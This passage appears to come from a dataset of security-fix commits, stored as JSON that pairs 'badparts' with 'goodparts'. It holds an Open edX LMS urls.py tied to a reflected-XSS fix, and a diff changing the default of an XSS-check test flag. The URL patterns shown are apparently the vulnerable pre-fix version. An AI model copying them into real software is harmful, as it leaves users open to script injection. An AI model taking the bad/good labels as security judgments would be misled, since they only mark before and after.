                    "sourceWithComments": "from django.conf import settings\nfrom django.conf.urls import patterns, include, url\nfrom django.contrib import admin\nfrom django.conf.urls.static import static\n\n# Not used, the work is done in the imported module.\nfrom . import one_time_startup      # pylint: disable=W0611\n\nimport django.contrib.auth.views\n\n# Uncomment the next two lines to enable the admin:\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    admin.autodiscover()\n\nurlpatterns = ('',  # nopep8\n    # certificate view\n\n    url(r'^update_certificate$', 'certificates.views.update_certificate'),\n    url(r'^$', 'branding.views.index', name=\"root\"),   # Main marketing page, or redirect to courseware\n    url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"),\n    url(r'^login$', 'student.views.signin_user', name=\"signin_user\"),\n    url(r'^register$', 'student.views.register_user', name=\"register_user\"),\n\n    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),\n\n    url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"),\n    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),\n    url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"),\n    url(r'^accept_name_change$', 'student.views.accept_name_change'),\n    url(r'^reject_name_change$', 'student.views.reject_name_change'),\n    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),\n    url(r'^event$', 'track.views.user_track'),\n    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?\n\n    url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"),\n\n    url(r'^login_ajax$', 'student.views.login_user', name=\"login\"),\n    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),\n    url(r'^logout$', 'student.views.logout_user', name='logout'),\n    url(r'^create_account$', 'student.views.create_account', name='create_account'),\n    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"),\n\n    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"),\n    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),\n\n    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),\n    ## Obsolete Django views for password resets\n    ## TODO: Replace with Mako-ized views\n    url(r'^password_change/$', django.contrib.auth.views.password_change,\n        name='auth_password_change'),\n    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,\n        name='auth_password_change_done'),\n    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',\n        'student.views.password_reset_confirm_wrapper',\n        name='auth_password_reset_confirm'),\n    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,\n        name='auth_password_reset_complete'),\n    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,\n        name='auth_password_reset_done'),\n\n    url(r'^heartbeat$', include('heartbeat.urls')),\n)\n\n# University profiles only make sense in the default edX context\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        ##\n        ## Only universities without courses should be included here.  If\n        ## courses exist, the dynamic profile rule below should win.\n        ##\n        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}),\n        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}),\n        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}),\n        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}),\n        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}),\n        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}),\n\n        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',\n            name=\"university_profile\"),\n    )\n\n#Semi-static views (these need to be rendered and have the login bar, but don't change)\nurlpatterns += (\n    url(r'^404$', 'static_template_view.views.render',\n        {'template': '404.html'}, name=\"404\"),\n)\n\n# Semi-static views only used by edX, not by themes\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        url(r'^jobs$', 'static_template_view.views.render',\n            {'template': 'jobs.html'}, name=\"jobs\"),\n        url(r'^press$', 'student.views.press', name=\"press\"),\n        url(r'^media-kit$', 'static_template_view.views.render',\n            {'template': 'media-kit.html'}, name=\"media-kit\"),\n        url(r'^faq$', 'static_template_view.views.render',\n            {'template': 'faq.html'}, name=\"faq_edx\"),\n        url(r'^help$', 'static_template_view.views.render',\n            {'template': 'help.html'}, name=\"help_edx\"),\n\n        # TODO: (bridger) The copyright has been removed until it is updated for edX\n        # url(r'^copyright$', 'static_template_view.views.render',\n        #     {'template': 'copyright.html'}, name=\"copyright\"),\n\n        #Press releases\n        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),\n\n        # Favicon\n        (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),\n\n        url(r'^submit_feedback$', 'util.views.submit_feedback'),\n\n    )\n\n# Only enable URLs for those marketing links actually enabled in the\n# settings. Disable URLs by marking them as None.\nfor key, value in settings.MKTG_URL_LINK_MAP.items():\n    # Skip disabled URLs\n    if value is None:\n        continue\n\n    # These urls are enabled separately\n    if key == \"ROOT\" or key == \"COURSES\" or key == \"FAQ\":\n        continue\n\n    # Make the assumptions that the templates are all in the same dir\n    # and that they all match the name of the key (plus extension)\n    template = \"%s.html\" % key.lower()\n\n    # To allow theme templates to inherit from default templates,\n    # prepend a standard prefix\n    if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n        template = \"theme-\" + template\n\n    # Make the assumption that the URL we want is the lowercased\n    # version of the map key\n    urlpatterns += (url(r'^%s' % key.lower(),\n                        'static_template_view.views.render',\n                        {'template': template}, name=value),)\n\n\nif settings.PERFSTATS:\n    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)\n\n# Multicourse wiki (Note: wiki urls must be above the courseware ones because of\n# the custom tab catch-all)\nif settings.WIKI_ENABLED:\n    from wiki.urls import get_pattern as wiki_pattern\n    from django_notify.urls import get_pattern as notify_pattern\n\n    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update\n    # them together.\n    urlpatterns += (\n        # First we include views from course_wiki that we use to override the default views.\n        # They come first in the urlpatterns so they get resolved first\n        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),\n        url(r'^wiki/', include(wiki_pattern())),\n        url(r'^notify/', include(notify_pattern())),\n\n        # These urls are for viewing the wiki in the context of a course. They should\n        # never be returned by a reverse() so they come after the other url patterns\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',\n            'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"),\n        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),\n    )\n\n\nif settings.COURSEWARE_ENABLED:\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',\n            'courseware.views.jump_to', name=\"jump_to\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.modx_dispatch',\n            name='modx_dispatch'),\n\n\n        # Software Licenses\n\n        # TODO: for now, this is the endpoint of an ajax replay\n        # service that retrieve and assigns license numbers for\n        # software assigned to a course. The numbers have to be loaded\n        # into the database.\n        url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.xqueue_callback',\n            name='xqueue_callback'),\n        url(r'^change_setting$', 'student.views.change_setting',\n            name='change_setting'),\n\n        # TODO: These views need to be updated before they work\n        url(r'^calculate$', 'util.views.calculate'),\n        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki\n        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),\n        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),\n\n        url(r'^courses/?$', 'branding.views.courses', name=\"courses\"),\n        url(r'^change_enrollment$',\n            'student.views.change_enrollment', name=\"change_enrollment\"),\n\n        #About the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',\n            'courseware.views.course_about', name=\"about_course\"),\n        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n        #View for mktg site\n        url(r'^mktg/(?P<course_id>.*)$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n\n\n\n        #Inside the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'courseware.views.course_info', name=\"course_root\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',\n            'courseware.views.course_info', name=\"info\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n            'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n            'staticbook.views.index', name=\"book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n            'courseware.views.index', name=\"courseware\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_chapter\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_section\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',\n            'courseware.views.index', name=\"courseware_position\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',\n            'courseware.views.progress', name=\"progress\"),\n        # Takes optional student_id for instructor use--shows profile as that student sees it.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',\n            'courseware.views.progress', name=\"student_progress\"),\n\n        # For the instructor\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',\n            'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',\n            'instructor.views.gradebook', name='gradebook'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',\n            'instructor.views.grade_summary', name='grade_summary'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',\n            'open_ended_grading.views.staff_grading', name='staff_grading'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',\n            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',\n            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),\n\n        # Open Ended problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',\n            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),\n\n        # Open Ended flagged problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',\n            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',\n            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),\n\n        # Cohorts management\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',\n            'course_groups.views.list_cohorts', name=\"cohorts\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',\n            'course_groups.views.add_cohort',\n            name=\"add_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',\n            'course_groups.views.users_in_cohort',\n            name=\"list_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',\n            'course_groups.views.add_users_to_cohort',\n            name=\"add_to_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',\n            'course_groups.views.remove_user_from_cohort',\n            name=\"remove_from_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',\n            'course_groups.views.debug_cohort_mgmt',\n            name=\"debug_cohort_mgmt\"),\n\n        # Open Ended Notifications\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',\n            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',\n            'open_ended_grading.views.peer_grading', name='peer_grading'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),\n\n    )\n\n    # allow course staff to change to student view of courseware\n    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):\n        urlpatterns += (\n            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"),\n        )\n\n    # discussion forums live within courseware, so courseware must be enabled first\n    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',\n                'courseware.views.news', name=\"news\"),\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',\n                include('django_comment_client.urls'))\n        )\n    urlpatterns += (\n        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',\n        'courseware.views.static_tab', name=\"static_tab\"),\n    )\n\n    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',\n                'courseware.views.submission_history',\n                name='submission_history'),\n        )\n\n\nif settings.ENABLE_JASMINE:\n    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)\n\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    ## Jasmine and admin\n    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID'):\n    urlpatterns += (\n        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),\n        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),\n        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),\n    )\n\nif settings.MITX_FEATURES.get('AUTH_USE_SHIB'):\n    urlpatterns += (\n        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),\n    )\n\nif settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):\n    urlpatterns += (\n        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_login', name='course-specific-login'),\n        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_register', name='course-specific-register'),\n\n    )\n\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):\n    urlpatterns += (\n        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),\n        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),\n        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),\n        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):\n    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),\n\nif settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):\n    urlpatterns += (\n        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),\n        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):\n    urlpatterns += (\n        url(r'^event_logs$', 'track.views.view_tracking_log'),\n        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):\n    urlpatterns += (\n        url(r'^status/', include('service_status.urls')),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):\n    urlpatterns += (\n        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),\n    )\n\nif settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):\n    urlpatterns += (\n        url(r'^edinsights_service/', include('edinsights.core.urls')),\n    )\n    import edinsights.core.registry\n\n# FoldIt views\nurlpatterns += (\n    # The path is hardcoded into their app...\n    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"),\n)\n\nif settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):\n    urlpatterns += (\n        url(r'^debug/run_python', 'debug.views.run_python'),\n    )\n\n# Crowdsourced hinting instructor manager.\nif settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',\n            'instructor.hint_manager.hint_manager', name=\"hint_manager\"),\n    )\n\nurlpatterns = patterns(*urlpatterns)\n\nif settings.DEBUG:\n    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)\n\n#Custom error pages\nhandler404 = 'static_template_view.views.render_404'\nhandler500 = 'static_template_view.views.render_500'\n"
                }
            },
            "msg": "Fix LMS-530, reflected XSS\n\nLimit the page and chapter numbers to digits, to keep malicious URL\ncomponents from being inserted onto the page."
        },
        "1162dbc18fda91b07a5942873387d60fd67b2cfc": {
            "url": "https://api.github.com/repos/h4ppyy/m-mooc/commits/1162dbc18fda91b07a5942873387d60fd67b2cfc",
            "html_url": "https://github.com/h4ppyy/m-mooc/commit/1162dbc18fda91b07a5942873387d60fd67b2cfc",
            "sha": "1162dbc18fda91b07a5942873387d60fd67b2cfc",
            "keyword": "XSS check",
            "diff": "diff --git a/pavelib/paver_tests/test_paver_bok_choy_cmds.py b/pavelib/paver_tests/test_paver_bok_choy_cmds.py\nindex 0573565146..9f37700463 100644\n--- a/pavelib/paver_tests/test_paver_bok_choy_cmds.py\n+++ b/pavelib/paver_tests/test_paver_bok_choy_cmds.py\n@@ -18,7 +18,7 @@ class TestPaverBokChoyCmd(unittest.TestCase):\n     Paver Bok Choy Command test cases\n     \"\"\"\n \n-    def _expected_command(self, name, store=None, verify_xss=False):\n+    def _expected_command(self, name, store=None, verify_xss=True):\n         \"\"\"\n         Returns the command that is expected to be run for the given test spec\n         and store.\n@@ -101,11 +101,11 @@ def test_verify_xss(self):\n         self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n \n     def test_verify_xss_env_var(self):\n-        self.env_var_override.set('VERIFY_XSS', 'True')\n+        self.env_var_override.set('VERIFY_XSS', 'False')\n         with self.env_var_override:\n             suite = BokChoyTestSuite('')\n             name = 'tests'\n-            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n+            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=False))\n \n     def test_test_dir(self):\n         test_dir = 'foo'\ndiff --git a/pavelib/utils/test/suites/bokchoy_suite.py b/pavelib/utils/test/suites/bokchoy_suite.py\nindex 19d51da7b5..327b6b9c3c 100644\n--- a/pavelib/utils/test/suites/bokchoy_suite.py\n+++ b/pavelib/utils/test/suites/bokchoy_suite.py\n@@ -58,7 +58,7 @@ def __init__(self, *args, **kwargs):\n         self.default_store = kwargs.get('default_store', None)\n         self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)\n         self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)\n-        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))\n+        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', True))\n         self.extra_args = kwargs.get('extra_args', '')\n         self.har_dir = self.log_dir / 'hars'\n         self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE\n",
            "message": "",
            "files": {
                "/pavelib/paver_tests/test_paver_bok_choy_cmds.py": {
                    "changes": [
                        {
                            "diff": "\n     Paver Bok Choy Command test cases\n     \"\"\"\n \n-    def _expected_command(self, name, store=None, verify_xss=False):\n+    def _expected_command(self, name, store=None, verify_xss=True):\n         \"\"\"\n         Returns the command that is expected to be run for the given test spec\n         and store.\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/pavelib/paver_tests/test_paver_bok_choy_cmds.py",
                            "badparts": [
                                "    def _expected_command(self, name, store=None, verify_xss=False):"
                            ],
                            "goodparts": [
                                "    def _expected_command(self, name, store=None, verify_xss=True):"
                            ]
                        },
                        {
                            "diff": "\n         self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n \n     def test_verify_xss_env_var(self):\n-        self.env_var_override.set('VERIFY_XSS', 'True')\n+        self.env_var_override.set('VERIFY_XSS', 'False')\n         with self.env_var_override:\n             suite = BokChoyTestSuite('')\n             name = 'tests'\n-            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n+            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=False))\n \n     def test_test_dir(self):\n         test_dir = 'foo'",
                            "add": 2,
                            "remove": 2,
                            "filename": "/pavelib/paver_tests/test_paver_bok_choy_cmds.py",
                            "badparts": [
                                "        self.env_var_override.set('VERIFY_XSS', 'True')",
                                "            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))"
                            ],
                            "goodparts": [
                                "        self.env_var_override.set('VERIFY_XSS', 'False')",
                                "            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=False))"
                            ]
                        }
                    ],
                    "source": "\n\"\"\" Tests for the bok-choy paver commands themselves. Run just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py \"\"\" import os import unittest from mock import patch, call from test.test_support import EnvironmentVarGuard from paver.easy import BuildFailure from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler REPO_DIR=os.getcwd() class TestPaverBokChoyCmd(unittest.TestCase): \"\"\" Paver Bok Choy Command test cases \"\"\" def _expected_command(self, name, store=None, verify_xss=False): \"\"\" Returns the command that is expected to be run for the given test spec and store. \"\"\" expected_statement=( \"DEFAULT_STORE={default_store} \" \"SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' \" \"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \" \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' \" \"SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' \" \"VERIFY_XSS='{verify_xss}' \" \"nosetests{repo_dir}/common/test/acceptance/{exp_text} \" \"--with-xunit \" \"--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml \" \"--verbosity=2 \" ).format( default_store=store, repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', exp_text=name, a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js', verify_xss=verify_xss ) return expected_statement def setUp(self): super(TestPaverBokChoyCmd, self).setUp() self.shard=os.environ.get('SHARD') self.env_var_override=EnvironmentVarGuard() def test_default(self): suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_suite_spec(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_class_spec(self): spec='test_foo.py:FooTest' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_testcase_spec(self): spec='test_foo.py:FooTest.test_bar' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_spec_with_draft_default_store(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec, default_store='draft') name='tests/{}'.format(spec) self.assertEqual( suite.cmd, self._expected_command(name=name, store='draft') ) def test_invalid_default_store(self): suite=BokChoyTestSuite('', default_store='invalid') name='tests' self.assertEqual( suite.cmd, self._expected_command(name=name, store='invalid') ) def test_serversonly(self): suite=BokChoyTestSuite('', serversonly=True) self.assertEqual(suite.cmd, \"\") def test_verify_xss(self): suite=BokChoyTestSuite('', verify_xss=True) name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_verify_xss_env_var(self): self.env_var_override.set('VERIFY_XSS', 'True') with self.env_var_override: suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_test_dir(self): test_dir='foo' suite=BokChoyTestSuite('', test_dir=test_dir) self.assertEqual( suite.cmd, self._expected_command(name=test_dir) ) def test_verbosity_settings_1_process(self): \"\"\" Using 1 process means paver should ask for the traditional xunit plugin for plugin results \"\"\" expected_verbosity_string=( \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '' ) ) suite=BokChoyTestSuite('', num_processes=1) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_2_processes(self): \"\"\" Using multiple processes means specific xunit, coloring, and process-related settings should be used. \"\"\" process_count=2 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', procs=process_count ) ) suite=BokChoyTestSuite('', num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), 